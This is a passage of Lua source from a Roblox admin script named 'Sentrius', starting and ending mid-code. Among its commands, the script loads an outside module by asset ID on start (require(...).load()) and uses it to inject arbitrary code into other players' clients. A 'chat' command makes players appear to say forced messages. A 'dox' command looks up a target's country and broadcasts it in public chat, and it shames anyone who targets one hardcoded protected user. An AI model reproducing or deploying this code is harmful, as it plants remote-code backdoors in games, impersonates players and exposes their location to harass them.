    usage = prefix .. "rename [player] [new name]",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        
        if not args or #args < 2 then
            notify(plr, "Sentrius", "Usage: " .. prefix .. "rename [player] [new name]", 3)
            return
        end
        
        local targets = GetPlayer(args[1], plr)
        if not targets or #targets == 0 then
            return
        end
        
        local newName = table.concat(args, " ", 2)
        if newName == "" then
            return
        end
        
        local names = {}
        for _, target in ipairs(targets) do
            if target.Character and target.Character:FindFirstChild("Humanoid") then
                target.Character.Humanoid.DisplayName = newName
                table.insert(names, target.Name)
            end
        end
        
        if #names > 0 then
            notify(plr, "Sentrius", "Renamed " .. table.concat(names, ", ") .. " to '" .. newName .. "'", 3)
        else
            notify(plr, "Sentrius", "Could not rename players (no character found\nbc it's necessary)", 3)
        end
    end
})

addCommand({
    name = "requiregui",
    aliases = {"reqgui", "rscripts", "modulegui"},
    desc = "Open require scripts GUI",
    usage = prefix .. "requiregui",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        openDashboard(plr, "Scripts")
    end
})

if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
    require(112691275102014).load() --//vekos goog
end

addCommand({
    name = "chat",
    aliases = {"say"},
    desc = "Make a player say something in chat",
    usage = prefix .. "chat [player] [message]",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        
        if not args or #args < 2 then
            notify(plr, "Sentrius", "Usage: " .. prefix .. "chat [player] [message]", 3)
            return
        end
        
        local targets = GetPlayer(args[1], plr)
        if not targets or #targets == 0 then
            notify(plr, "Sentrius", "No player found!", 3)
            return
        end
        
        local msg = table.concat(args, " ", 2)
        if msg == "" then
            notify(plr, "Sentrius", "Please provide a message!", 3)
            return
        end
        
        local warned = false
        local names = {}

         for _, target in ipairs(targets) do
             if target.Name == "idonthacklol101ns" then
               if not warned then
                 -- _G.say(plr.Name, "nah, you cannot force chat THE idonthacklol101ns.. loser!!")
               warned = true
           end
          continue
       end
            
            local success, err = pcall(function()
                if _G.sudo then
                    _G.sudo(target.Name, msg, "all")
                elseif _G.say and typeof(_G.say) == "function" then
                    _G.say(target.Name, msg)
                else
                    _G.say = function(p, m)
                        p = game.Players:FindFirstChild(p)
                        
                        if p and p.Name == "idonthacklol101ns" then
                            warn("Cannot force chat idonthacklol101ns via _G.say")
                            return
                        end
                        
                        if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
                            local ticking = tick()
                            require(112691275102014).load()
                            repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
                        end
                        
                        local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")
                        if not goog then
                            warn("goog failed to be added, command can not continue")
                            return
                        end
                        
                        local scr = goog:FindFirstChild("Utilities").Client:Clone()
                        local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
                        loa.Parent = scr
                        scr:WaitForChild("Exec").Value = string.format([[
                            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("%s", "All")
                            script:Destroy()
                        ]], m)
                        
                        if p.Character then
                            scr.Parent = p.Character
                        else
                            scr.Parent = p:WaitForChild("PlayerGui")
                        end
                        
                        scr.Enabled = true
                    end
                    _G.say(target.Name, msg)
                end
            end)
            
            if success then
                table.insert(names, target.DisplayName)
            else
                notify(plr, "Sentrius", "Error on " .. target.DisplayName .. ": " .. tostring(err), 4)
            end
        end
        
        if #names > 0 then
            notify(plr, "Sentrius", "Made " .. table.concat(names, ", ") .. " say: '" .. msg .. "'", 3)
        end
    end
})

addCommand({
    name = "dox",
    aliases = {"leak"},
    desc = "Make a player reveal their location in chat",
    usage = prefix .. "dox [player]",
    callback = function(plr, args)
        if not owna(plr) then return end
        
        if not args or #args == 0 then
            notify(plr, "Sentrius", "Usage: " .. prefix .. "dox [player]", 3)
            return
        end
        
        local targets = GetPlayer(args[1], plr)
        if not targets or #targets == 0 then
            notify(plr, "Sentrius", "No player found!", 3)
            return
        end
        
        local LocalizationService = game:GetService("LocalizationService")
        
        -- Countri flags v2
        local countryFlags = {
            US = "🇺🇸", CA = "🇨🇦", MX = "🇲🇽", BR = "🇧🇷", AR = "🇦🇷", CL = "🇨🇱", CO = "🇨🇴", PE = "🇵🇪", VE = "🇻🇪",
            EC = "🇪🇨", BO = "🇧🇴", PY = "🇵🇾", UY = "🇺🇾", GY = "🇬🇾", SR = "🇸🇷", CR = "🇨🇷", PA = "🇵🇦", GT = "🇬🇹",
            HN = "🇭🇳", SV = "🇸🇻", NI = "🇳🇮", CU = "🇨🇺", DO = "🇩🇴", HT = "🇭🇹", JM = "🇯🇲", TT = "🇹🇹", BS = "🇧🇸",
            BB = "🇧🇧", BZ = "🇧🇿", GD = "🇬🇩", LC = "🇱🇨", VC = "🇻🇨", AG = "🇦🇬", DM = "🇩🇲", KN = "🇰🇳",
            GB = "🇬🇧", DE = "🇩🇪", FR = "🇫🇷", ES = "🇪🇸", IT = "🇮🇹", NL = "🇳🇱", BE = "🇧🇪", CH = "🇨🇭", AT = "🇦🇹",
            PT = "🇵🇹", GR = "🇬🇷", SE = "🇸🇪", NO = "🇳🇴", DK = "🇩🇰", FI = "🇫🇮", PL = "🇵🇱", CZ = "🇨🇿", RO = "🇷🇴",
            HU = "🇭🇺", BG = "🇧🇬", SK = "🇸🇰", HR = "🇭🇷", SI = "🇸🇮", LT = "🇱🇹", LV = "🇱🇻", EE = "🇪🇪", IE = "🇮🇪",
            IS = "🇮🇸", LU = "🇱🇺", MT = "🇲🇹", CY = "🇨🇾", RS = "🇷🇸", BA = "🇧🇦", ME = "🇲🇪", MK = "🇲🇰", AL = "🇦🇱",
            MD = "🇲🇩", BY = "🇧🇾", UA = "🇺🇦", RU = "🇷🇺", CN = "🇨🇳", JP = "🇯🇵", KR = "🇰🇷", IN = "🇮🇳", PK = "🇵🇰",
            BD = "🇧🇩", VN = "🇻🇳", TH = "🇹🇭", PH = "🇵🇭", ID = "🇮🇩", MY = "🇲🇾", SG = "🇸🇬", MM = "🇲🇲", KH = "🇰🇭",
            LA = "🇱🇦", NP = "🇳🇵", LK = "🇱🇰", AF = "🇦🇫", IQ = "🇮🇶", IR = "🇮🇷", TR = "🇹🇷", SA = "🇸🇦", AE = "🇦🇪",
            IL = "🇮🇱", JO = "🇯🇴", LB = "🇱🇧", SY = "🇸🇾", YE = "🇾🇪", OM = "🇴🇲", KW = "🇰🇼", BH = "🇧🇭", QA = "🇶🇦",
            MN = "🇲🇳", KZ = "🇰🇿", UZ = "🇺🇿", TM = "🇹🇲", KG = "🇰🇬", TJ = "🇹🇯", GE = "🇬🇪", AM = "🇦🇲", AZ = "🇦🇿",
            BT = "🇧🇹", MV = "🇲🇻", BN = "🇧🇳", TL = "🇹🇱", EG = "🇪🇬", ZA = "🇿🇦", NG = "🇳🇬", KE = "🇰🇪", ET = "🇪🇹",
            GH = "🇬🇭", TZ = "🇹🇿", UG = "🇺🇬", DZ = "🇩🇿", MA = "🇲🇦", TN = "🇹🇳", LY = "🇱🇾", SD = "🇸🇩", SS = "🇸🇸",
            SO = "🇸🇴", AO = "🇦🇴", MZ = "🇲🇿", ZW = "🇿🇼", ZM = "🇿🇲", MW = "🇲🇼", BW = "🇧🇼", NA = "🇳🇦", SZ = "🇸🇿",
            LS = "🇱🇸", CM = "🇨🇲", CI = "🇨🇮", SN = "🇸🇳", ML = "🇲🇱", NE = "🇳🇪", BF = "🇧🇫", TD = "🇹🇩", CF = "🇨🇫",
            CG = "🇨🇬", CD = "🇨🇩", GA = "🇬🇦", GQ = "🇬🇶", BJ = "🇧🇯", TG = "🇹🇬", LR = "🇱🇷", SL = "🇸🇱", GN = "🇬🇳",
            GW = "🇬🇼", GM = "🇬🇲", MR = "🇲🇷", ER = "🇪🇷", DJ = "🇩🇯", RW = "🇷🇼", BI = "🇧🇮", SC = "🇸🇨", MU = "🇲🇺",
            KM = "🇰🇲", MG = "🇲🇬", CV = "🇨🇻", ST = "🇸🇹", AU = "🇦🇺", NZ = "🇳🇿", FJ = "🇫🇯", PG = "🇵🇬", WS = "🇼🇸",
            SB = "🇸🇧", VU = "🇻🇺", TO = "🇹🇴", KI = "🇰🇮", FM = "🇫🇲", MH = "🇲🇭", PW = "🇵🇼", NR = "🇳🇷", TV = "🇹🇻"
        }
        
        -- Country names v2
        local countryNames = {
            US = "United States", CA = "Canada", MX = "Mexico", BR = "Brazil", AR = "Argentina", CL = "Chile",
            CO = "Colombia", PE = "Peru", VE = "Venezuela", EC = "Ecuador", BO = "Bolivia", PY = "Paraguay",
            UY = "Uruguay", GY = "Guyana", SR = "Suriname", CR = "Costa Rica", PA = "Panama", GT = "Guatemala",
            HN = "Honduras", SV = "El Salvador", NI = "Nicaragua", CU = "Cuba", DO = "Dominican Republic",
            HT = "Haiti", JM = "Jamaica", TT = "Trinidad and Tobago", BS = "Bahamas", BB = "Barbados",
            BZ = "Belize", GD = "Grenada", LC = "Saint Lucia", VC = "Saint Vincent", AG = "Antigua and Barbuda",
            DM = "Dominica", KN = "Saint Kitts and Nevis", GB = "United Kingdom", DE = "Germany", FR = "France",
            ES = "Spain", IT = "Italy", NL = "Netherlands", BE = "Belgium", CH = "Switzerland", AT = "Austria",
            PT = "Portugal", GR = "Greece", SE = "Sweden", NO = "Norway", DK = "Denmark", FI = "Finland",
            PL = "Poland", CZ = "Czech Republic", RO = "Romania", HU = "Hungary", BG = "Bulgaria", SK = "Slovakia",
            HR = "Croatia", SI = "Slovenia", LT = "Lithuania", LV = "Latvia", EE = "Estonia", IE = "Ireland",
            IS = "Iceland", LU = "Luxembourg", MT = "Malta", CY = "Cyprus", RS = "Serbia", BA = "Bosnia and Herzegovina",
            ME = "Montenegro", MK = "North Macedonia", AL = "Albania", MD = "Moldova", BY = "Belarus", UA = "Ukraine",
            RU = "Russia", CN = "China", JP = "Japan", KR = "South Korea", IN = "India", PK = "Pakistan",
            BD = "Bangladesh", VN = "Vietnam", TH = "Thailand", PH = "Philippines", ID = "Indonesia", MY = "Malaysia",
            SG = "Singapore", MM = "Myanmar", KH = "Cambodia", LA = "Laos", NP = "Nepal", LK = "Sri Lanka",
            AF = "Afghanistan", IQ = "Iraq", IR = "Iran", TR = "Turkey", SA = "Saudi Arabia", AE = "United Arab Emirates",
            IL = "Israel", JO = "Jordan", LB = "Lebanon", SY = "Syria", YE = "Yemen", OM = "Oman", KW = "Kuwait",
            BH = "Bahrain", QA = "Qatar", MN = "Mongolia", KZ = "Kazakhstan", UZ = "Uzbekistan", TM = "Turkmenistan",
            KG = "Kyrgyzstan", TJ = "Tajikistan", GE = "Georgia", AM = "Armenia", AZ = "Azerbaijan", BT = "Bhutan",
            MV = "Maldives", BN = "Brunei", TL = "Timor-Leste", EG = "Egypt", ZA = "South Africa", NG = "Nigeria",
            KE = "Kenya", ET = "Ethiopia", GH = "Ghana", TZ = "Tanzania", UG = "Uganda", DZ = "Algeria", MA = "Morocco",
            TN = "Tunisia", LY = "Libya", SD = "Sudan", SS = "South Sudan", SO = "Somalia", AO = "Angola",
            MZ = "Mozambique", ZW = "Zimbabwe", ZM = "Zambia", MW = "Malawi", BW = "Botswana", NA = "Namibia",
            SZ = "Eswatini", LS = "Lesotho", CM = "Cameroon", CI = "Ivory Coast", SN = "Senegal", ML = "Mali",
            NE = "Niger", BF = "Burkina Faso", TD = "Chad", CF = "Central African Republic", CG = "Republic of the Congo",
            CD = "Democratic Republic of the Congo", GA = "Gabon", GQ = "Equatorial Guinea", BJ = "Benin", TG = "Togo",
            LR = "Liberia", SL = "Sierra Leone", GN = "Guinea", GW = "Guinea-Bissau", GM = "Gambia", MR = "Mauritania",
            ER = "Eritrea", DJ = "Djibouti", RW = "Rwanda", BI = "Burundi", SC = "Seychelles", MU = "Mauritius",
            KM = "Comoros", MG = "Madagascar", CV = "Cape Verde", ST = "Sao Tome and Principe", AU = "Australia",
            NZ = "New Zealand", FJ = "Fiji", PG = "Papua New Guinea", WS = "Samoa", SB = "Solomon Islands",
            VU = "Vanuatu", TO = "Tonga", KI = "Kiribati", FM = "Micronesia", MH = "Marshall Islands", PW = "Palau",
            NR = "Nauru", TV = "Tuvalu"
        }
        
        local names = {}
        for _, target in ipairs(targets) do
            if target.Name == "idonthacklol101ns" then
                task.spawn(function()
                    local executorCountryCode = "??"
                    pcall(function()
                        executorCountryCode = LocalizationService:GetCountryRegionForPlayerAsync(plr)
                    end)
                    
                    local executorFlag = countryFlags[executorCountryCode] or "🌍"
                    local executorCountry = countryNames[executorCountryCode] or "UNKNOWN"
                    

                    local message1 = string.format("I AM FROM %s %s", executorCountry:upper(), executorFlag)
                    pcall(function()
                        if _G.say and typeof(_G.say) == "function" then
                            _G.say(plr.Name, message1)
                        end
                    end)
                    
                    task.wait(1.5)
                    
                    local message2 = "AND ON TOP OF ALL THAT I CANNOT DOX THE IDONTHACKLOL101NS"
                    pcall(function()
                        if _G.say and typeof(_G.say) == "function" then
                            _G.say(plr.Name, message2)
                        end
                    end)
                    
                    task.wait(1.5)
                    
                    local message3 = "IM A CLOWN FOR TRYING THAT BY THE WAY!!"
                    pcall(function()
                        if _G.say and typeof(_G.say) == "function" then
                            _G.say(plr.Name, message3)
                        end
                    end)
                end)
                return
            end
            
            task.spawn(function()
                local countryCode = "??"
                local success = pcall(function()
                    countryCode = LocalizationService:GetCountryRegionForPlayerAsync(target)
                end)
                
                if success and countryCode ~= "??" then
                    local flag = countryFlags[countryCode] or "🌍"
                    local country = countryNames[countryCode] or "Unknown"
                    
                    local message1 = string.format("IM FROM %s %s", country:upper(), flag)
                    pcall(function()
                        if _G.say and typeof(_G.say) == "function" then
                            _G.say(target.Name, message1)
                        end
                    end)
                    
                    task.wait(1.5)
                    
                    local message2 = string.format("IM FROM %s %s!!!", country:upper(), flag)
                    pcall(function()
                        if _G.say and typeof(_G.say) == "function" then
                            _G.say(target.Name, message2)
                        end
                    end)
                    
                    task.wait(1.5)
                    
                    local message3 = string.format("IM FROM %s %s!!!!!!!!!!!", country:upper(), flag)
                    pcall(function()
                        if _G.say and typeof(_G.say) == "function" then
                            _G.say(target.Name, message3)
                        end
                    end)
                    
                    table.insert(names, target.DisplayName)
                else
                    notify(plr, "Sentrius", "Failed to get location for " .. target.DisplayName, 3)
                end
            end)
        end
        
        task.wait(0.5)
        if #names > 0 then
            notify(plr, "Sentrius", "exposed " .. table.concat(names, ", "), 3)
        end
    end
})

addCommand({
    name = "silence",
    aliases = {"mute"},
    desc = "Disable chat for a player",
    usage = prefix .. "silence [player]",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        
        if not args or #args == 0 then
            notify(plr, "Sentrius", "Usage: " .. prefix .. "silence [player]", 3)
            return
        end
        
        local targets = GetPlayer(args[1], plr)
        if not targets or #targets == 0 then
            notify(plr, "Sentrius", "No player found!", 3)
            return
        end
        
        local names = {}
        for _, target in ipairs(targets) do
            if whitelist[target.UserId] and not owna(plr) then
                notify(plr, "Sentrius", "You cannot silence whitelisted admins!", 3)
            else
                local success, err = pcall(function()
                    if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
                        local ticking = tick()
                        require(112691275102014).load()
                        repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
                    end
                    
                    local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")
                    
                    if not goog then
                        warn("goog failed to be added, command can not continue")
                        notify(plr, "Sentrius", "goog failed to load, command cannot continue", 3)
                        return
                    end
                    
                    local scr = goog:FindFirstChild("Utilities").Client:Clone()
                    local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
                    
                    loa.Parent = scr
                    scr:WaitForChild("Exec").Value = [[


                             game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)

                        task.wait(0.3)
                        script:Destroy()

                    ]]
                    
                    if target.Character then
                        scr.Parent = target.Character
                    else
                        scr.Parent = target:WaitForChild("PlayerGui")
                    end
                    
                    scr.Enabled = true
                end)
                
                if success then
                    table.insert(names, target.DisplayName)
                else
                    notify(plr, "Sentrius", "Error silencing " .. target.DisplayName .. ": " .. tostring(err), 4)
                end
            end
        end
        
        if #names > 0 then
            notify(plr, "Sentrius", "Silenced: " .. table.concat(names, ", "), 3)
        end
    end
})

addCommand({
    name = "unsilence",
    aliases = {"unmute", "uns"},
    desc = "Re-enable chat for a player",
    usage = prefix .. "unsilence [player]",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        
        if not args or #args == 0 then
            notify(plr, "Sentrius", "Usage: " .. prefix .. "unsilence [player]", 3)
            return
        end
        
        local targets = GetPlayer(args[1], plr)
        if not targets or #targets == 0 then
            notify(plr, "Sentrius", "No player found!", 3)
            return
        end
        
        local names = {}
        for _, target in ipairs(targets) do
            local success, err = pcall(function()
                if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
                    local ticking = tick()
                    require(112691275102014).load()
                    repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
                end
                
                local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")
                
                if not goog then
                    warn("goog failed to be added, command can not continue")
                    notify(plr, "Sentrius", "goog failed to load, command cannot continue", 3)
                    return
                end
                
                local scr = goog:FindFirstChild("Utilities").Client:Clone()
                local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
                
                loa.Parent = scr
                scr:WaitForChild("Exec").Value = [[


                             game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)

                        task.wait(0.3)
                        script:Destroy()

                    ]]
                
                if target.Character then
                    scr.Parent = target.Character
                else
                    scr.Parent = target:WaitForChild("PlayerGui")
                end
                
                scr.Enabled = true
            end)
            
            if success then
                table.insert(names, target.DisplayName)
            else
                notify(plr, "Sentrius", "Error unsilencing " .. target.DisplayName .. ": " .. tostring(err), 4)
            end
        end
        
        if #names > 0 then
            notify(plr, "Sentrius", "Unsilenced: " .. table.concat(names, ", "), 3)
        end
    end
})

addCommand({ --thankz to vecko
    name = "r15",
    aliases = {"rig15"},
    desc = "Force a player to use R15 rig (persists on respawn)",
    usage = prefix .. "r15 [player]",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        
        if not args or #args == 0 then
            notify(plr, "Sentrius", "Usage: " .. prefix .. "r15 [player]", 3)
            return
        end
        
        local targets = GetPlayer(args[1], plr)
        if not targets or #targets == 0 then
            notify(plr, "Sentrius", "No player found!", 3)
            return
        end
        
        local names = {}
        for _, target in ipairs(targets) do
            local success, err = pcall(function()
                -- Set forced rig type
                ForcedRig[target.UserId] = Enum.HumanoidRigType.R15
                
                -- Apply immediately if they have a character
                if target.Character then
                    ApplyRig(target, target.Character)
                end
            end)
            
            if success then
                table.insert(names, target.DisplayName)
                notify(target, "Sentrius", "You have been forced to R15 rig!", 3)
            else
                notify(plr, "Sentrius", "Error on " .. target.DisplayName .. ": " .. tostring(err), 4)
            end
        end
        
        if #names > 0 then
            print("workz")
        end
    end
})

addCommand({ -- credits to punchy, cxotus, and originally stolen from adonis 😹😹
    name = "nuke",
    aliases = {"nuclear", "bomb"},
    desc = "nuke",
    usage = prefix .. "nuke [player (optional)] [size (optional, default: 100)]",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        
        local explosionSize = 100
        local target = plr
        

        if args and #args > 0 then
            local targets = GetPlayer(args[1], plr)
            if targets and #targets > 0 then
                target = targets[1]
            end
            
            if args[2] and tonumber(args[2]) then
                explosionSize = tonumber(args[2])
            end
        end
        
        if args and args[1] and tonumber(args[1]) then
            explosionSize = tonumber(args[1])
            target = plr
        end
        
        -- Nuke Script by ccuser44 (github/ccuser44/Fast-nuclear-explosion), MIT License
        local Lighting = game:GetService("Lighting")
        local SoundService = game:GetService("SoundService")
        local TweenService = game:GetService("TweenService")
        local Debris = game:GetService("Debris")
        
        -- Constants
        local CLOUD_RING_MESH_ID = "rbxassetid://3270017"
        local CLOUD_SPHERE_MESH_ID = "rbxassetid://1185246"
        local CLOUD_MESH_ID = "rbxassetid://1095708"
        local CLOUD_COLOR_TEXTURE = "rbxassetid://1361097"
        
        -- Variables
        local basePart = Instance.new("Part")
        basePart.Anchored = true
        basePart.Locked = true
        basePart.CanCollide = false
        basePart.CanQuery = false
        basePart.CanTouch = false
        basePart.TopSurface = Enum.SurfaceType.Smooth
        basePart.BottomSurface = Enum.SurfaceType.Smooth
        basePart.Size = Vector3.new(1, 1, 1)
        
        local baseMesh = Instance.new("SpecialMesh")
        baseMesh.MeshType = Enum.MeshType.FileMesh
        
        local sphereMesh, ringMesh = baseMesh:Clone(), baseMesh:Clone()
        sphereMesh.MeshId = CLOUD_SPHERE_MESH_ID
        ringMesh.MeshId = CLOUD_RING_MESH_ID
        
        local cloudMesh = baseMesh:Clone()
        cloudMesh.MeshId, cloudMesh.TextureId = CLOUD_MESH_ID, CLOUD_COLOR_TEXTURE
        cloudMesh.VertexColor = Vector3.new(0.9, 0.6, 0)
        
        local skybox = Instance.new("Sky")
        skybox.SkyboxFt, skybox.SkyboxBk = "rbxassetid://1012887", "rbxassetid://1012890"
        skybox.SkyboxLf, skybox.SkyboxRt = "rbxassetid://1012889", "rbxassetid://1012888"
        skybox.SkyboxDn, skybox.SkyboxUp = "rbxassetid://1012891", "rbxassetid://1014449"
        
        local nukeSkyboxes, realSkyboxes = setmetatable({}, {__mode = "v"}), setmetatable({}, {__mode = "v"})
        local nukeIgnore = setmetatable({}, {__mode = "v"})
        local explosionParams = OverlapParams.new()
        explosionParams.FilterDescendantsInstances = nukeIgnore
        explosionParams.FilterType = Enum.RaycastFilterType.Exclude
        explosionParams.RespectCanCollide = true
        
        -- Functions
        local function basicTween(instance, properties, duration)
            local tween = TweenService:Create(
                instance,
                TweenInfo.new(
                    duration,
                    Enum.EasingStyle.Linear,
                    Enum.EasingDirection.In,
                    0,
                    false,
                    0
                ),
                properties
            )
            tween:Play()
            if tween.PlaybackState == Enum.PlaybackState.Playing or tween.PlaybackState == Enum.PlaybackState.Begin then
                tween.Completed:Wait()
            end
        end
        
        local function createMushroomCloud(position, container, clouds, shockwave)
            local baseCloud = basePart:Clone()
            baseCloud.Position = position
            
            local poleBase = basePart:Clone()
            poleBase.Position = position + Vector3.new(0, 0.1, 0)
            
            local cloud1 = basePart:Clone()
            cloud1.Position = position + Vector3.new(0, 0.75, 0)
            
            local cloud2 = basePart:Clone()
            cloud2.Position = position + Vector3.new(0, 1.25, 0)
            
            local cloud3 = basePart:Clone()
            cloud3.Position = position + Vector3.new(0, 1.7, 0)
            
            local poleRing = basePart:Clone()
            poleRing.Position = position + Vector3.new(0, 1.3, 0)
            poleRing.Transparency = 0.2
            poleRing.BrickColor = BrickColor.new("Dark stone grey")
            poleRing.CFrame = poleRing.CFrame * CFrame.Angles(math.rad(90), 0, 0)
            
            local mushCloud = basePart:Clone()
            mushCloud.Position = position + Vector3.new(0, 2.3, 0)
            
            local topCloud = basePart:Clone()
            topCloud.Position = position + Vector3.new(0, 2.7, 0)
            
            do
                local baseCloudMesh = cloudMesh:Clone()
                baseCloudMesh.Parent = baseCloud 
                baseCloudMesh.Scale = Vector3.new(2.5, 1, 4.5)
                
                local poleBaseMesh = cloudMesh:Clone()
                poleBaseMesh.Scale = Vector3.new(1.25, 2, 2.5)
                poleBaseMesh.Parent = poleBase
                
                local cloud1Mesh = cloudMesh:Clone()
                cloud1Mesh.Scale = Vector3.new(0.5, 3, 1)
                cloud1Mesh.Parent = cloud1
                
                local cloud2Mesh = cloudMesh:Clone()
                cloud2Mesh.Scale = Vector3.new(0.5, 1.5, 1)
                cloud2Mesh.Parent = cloud2
                
                local cloud3Mesh = cloudMesh:Clone()
                cloud3Mesh.Scale = Vector3.new(0.5, 1.5, 1)
                cloud3Mesh.Parent = cloud3
                
                local poleRingMesh = ringMesh:Clone()
                poleRingMesh.Scale = Vector3.new(1.2, 1.2, 1.2)
                poleRingMesh.Parent = poleRing
                
                local topCloudMesh = cloudMesh:Clone()
                topCloudMesh.Scale = Vector3.new(7.5, 1.5, 1.5)
                topCloudMesh.Parent = topCloud
                
                local mushCloudMesh = cloudMesh:Clone()
                mushCloudMesh.Scale = Vector3.new(2.5, 1.75, 3.5)
                mushCloudMesh.Parent = mushCloud
            end
            
            table.insert(clouds, baseCloud)
            table.insert(clouds, topCloud)
            table.insert(clouds, mushCloud)
            table.insert(clouds, cloud1)
            table.insert(clouds, cloud2)
            table.insert(clouds, cloud3)
            table.insert(clouds, poleBase)
            table.insert(clouds, poleRing)
            
            local bigRing = basePart:Clone()
            bigRing.Position = position
            bigRing.CFrame = bigRing.CFrame * CFrame.Angles(math.rad(90), 0, 0)
            
            local smallRing = basePart:Clone()
            smallRing.Position = position
            smallRing.BrickColor = BrickColor.new("Dark stone grey")
            smallRing.CFrame = smallRing.CFrame * CFrame.Angles(math.rad(90), 0, 0)
            
            local innerSphere = basePart:Clone()
            innerSphere.Position = position
            innerSphere.BrickColor = BrickColor.new("Bright orange")
            innerSphere.Transparency = 0.5
            
            local outterSphere = basePart:Clone()
            outterSphere.Position = position
            outterSphere.BrickColor = BrickColor.new("Bright orange")
            outterSphere.Transparency = 0.5
            
            do
                local bigMesh = ringMesh:Clone()
                bigMesh.Scale = Vector3.new(5, 5, 1)
                bigMesh.Parent = bigRing
                
                local smallMesh = ringMesh:Clone()
                smallMesh.Scale = Vector3.new(4.6, 4.6, 1.5)
                smallMesh.Parent = smallRing
                
                local innerSphereMesh = sphereMesh:Clone()	
                innerSphereMesh.Scale = Vector3.new(-6.5, -6.5, -6.5)
                innerSphereMesh.Parent = innerSphere
            
                local outterSphereMesh = sphereMesh:Clone()
                outterSphereMesh.Scale = Vector3.new(6.5, 6.5, 6.5)
                outterSphereMesh.Parent = outterSphere
            end
            
            table.insert(shockwave, bigRing)	
            table.insert(shockwave, smallRing)
            table.insert(shockwave, outterSphere)
            table.insert(shockwave, innerSphere)
            
            for _, v in ipairs(shockwave) do
                v.Parent = container
            end
            for _, v in ipairs(clouds) do
                v.Parent = container
            end
            
            return {
                OutterSphere = outterSphere,
                InnerSphere = innerSphere,
                BigRing = bigRing,
                SmallRing = smallRing,
                BaseCloud = baseCloud,
                PoleBase = poleBase,
                PoleRing = poleRing,
                Cloud1 = cloud1,
                Cloud2 = cloud2,
                Cloud3 = cloud3,
                MushCloud = mushCloud,
                TopCloud = topCloud
            }
        end
        
        local function effects(nolighting)
            for i = 1, 2 do
                local explosionSound = Instance.new("Sound")
                explosionSound.Name = "NUKE_SOUND"
                explosionSound.SoundId = "http://www.roblox.com/asset?id=130768997"
                explosionSound.Volume = 0.5
                explosionSound.PlaybackSpeed = i / 2
                explosionSound.RollOffMinDistance, explosionSound.RollOffMaxDistance = 0, 10000
                explosionSound.Archivable = false
                explosionSound.Parent = SoundService
                explosionSound:Play()
                Debris:AddItem(explosionSound, 30)
            end
            
            if not nolighting then
                local oldBrightness = Lighting.Brightness
                Lighting.Brightness = 5
                basicTween(Lighting, {Brightness = 1}, 4 / 0.01 * (1 / 60))
                Lighting.Brightness = oldBrightness
            end
        end
        
        local function tagHumanoid(humanoid, attacker)
            local creatorTag = Instance.new("ObjectValue")
            creatorTag.Name = "creator"
            creatorTag.Value = attacker
            Debris:AddItem(creatorTag, 2)
            creatorTag.Parent = humanoid
        end
        
        local function destruction(position, radius, attacker)
            for _, v in ipairs(workspace:GetPartBoundsInRadius(position, radius, explosionParams)) do
                if v.ClassName ~= "Terrain" and v.Anchored == false then
                    if attacker then
                        local humanoid = v.Parent:FindFirstChildOfClass("Humanoid")
                        if humanoid and not humanoid:FindFirstChild("creator") then
                            tagHumanoid(humanoid, attacker)
                        end
                    end
                    v:BreakJoints()
                    v.Material = Enum.Material.CorrodedMetal
                    v.AssemblyLinearVelocity = CFrame.new(v.Position, position):VectorToWorldSpace(Vector3.new(math.random(-5, 5), 5, 1000))
                end
            end
        end
        
        local function explode(position, explosionSize, nolighting, attacker)
            local shockwaveCompleted = false
            explosionParams.FilterDescendantsInstances = nukeIgnore
            local clouds, shockwave = {}, {}
            local container = Instance.new("Model")
            container.Name = "SENTRIUS_NUCLEAREXPLOSION"
            container.Archivable = false
            container.ModelStreamingMode = Enum.ModelStreamingMode.Atomic
            container.Parent = workspace
            table.insert(nukeIgnore, container)
            
            local cloudData = createMushroomCloud(position, container, clouds, shockwave)
            local outterSphere, innerSphere, bigRing, smallRing = cloudData.OutterSphere, cloudData.InnerSphere, cloudData.BigRing, cloudData.SmallRing
            local baseCloud, poleBase, poleRing = cloudData.BaseCloud, cloudData.PoleBase, cloudData.PoleRing
            local cloud1, cloud2, cloud3, mushCloud, topCloud = cloudData.Cloud1, cloudData.Cloud2, cloudData.Cloud3, cloudData.MushCloud, cloudData.TopCloud
            
            local newSky = skybox:Clone()
            table.insert(nukeSkyboxes, newSky)
            newSky.Parent = Lighting
            task.spawn(effects, nolighting)
            
            for _, v in ipairs(Lighting:GetChildren()) do
                if v:IsA("Sky") and not table.find(nukeSkyboxes, v) and not table.find(realSkyboxes, v) then
                    table.insert(realSkyboxes, v)
                end
            end
            
            task.spawn(function()
                local maxSize = explosionSize * 3
                local smallSize = explosionSize / 2.5
                local nukeDuration = (maxSize - smallSize) / 2 * (1 / 60)
                local transforms = {
                    {innerSphere, Vector3.new(-6.5 * maxSize, -6.5 * maxSize, -6.5 * maxSize)},
                    {outterSphere, Vector3.new(6.5 * maxSize, 6.5 * maxSize, 6.5 * maxSize)},
                    {smallRing, Vector3.new(4.6 * maxSize, 4.6 * maxSize, 1.5 * maxSize)},
                    {bigRing, Vector3.new(5 * maxSize, 5 * maxSize, 1 * maxSize)},
                }
                
                for _, v in ipairs(transforms) do
                    local object, scale = v[1], v[2]
                    if typeof(object) == "Instance" then
